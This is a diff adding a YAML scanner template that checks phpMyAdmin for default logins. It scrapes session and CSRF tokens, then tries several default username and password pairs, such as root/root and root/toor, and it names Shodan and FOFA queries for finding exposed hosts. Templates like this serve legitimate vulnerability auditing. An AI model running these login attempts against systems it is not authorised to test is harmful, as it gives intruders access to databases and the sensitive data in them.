@@ -1,0 +1,65 @@
+id: phpmyadmin-default-login
+
+info:
+  name: phpMyAdmin - Default Login
+  author: Natto97
+  severity: high
+  verified: false
+  description: |-
+    phpMyAdmin contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    shodan: http.title:phpMyAdmin
+    fofa: title="phpMyAdmin"
+  reference:
+    - https://www.phpmyadmin.net
+  tags: default-login,phpmyadmin
+  created: 2023/06/24
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php
+    expression: response.body.bcontains(b'name="token"') && response.body.bcontains(b'name="set_session"')
+    stop_if_mismatch: true
+    output:
+      search: |
+        "name=\"token\" value=\"(?P<token>.*?)\"".bsubmatch(response.body)
+      token: search["token"]
+      search1: |
+        "name=\"set_session\" value=\"(?P<token2>.*?)\"".bsubmatch(response.body)
+      token2: search1["token2"]
+      search2: |
+        "phpMyAdmin=(?P<session>[0-9a-z]+)".bsubmatch(response.raw_header)
+      session: search2["session"]
+  r1:
+    stop_if_match: true
+    brute:
+      mode: pitchfork
+      commit: winner
+      continue: false
+      username:
+        - root
+        - root
+        - mysql
+        - root
+        - test
+        - test
+      password:
+        - root
+        - 123456
+        - mysql
+        - toor
+        - test
+        - 123456
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username={{username}}&pma_password={{password}}&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=')
+expression: r0() && r1()
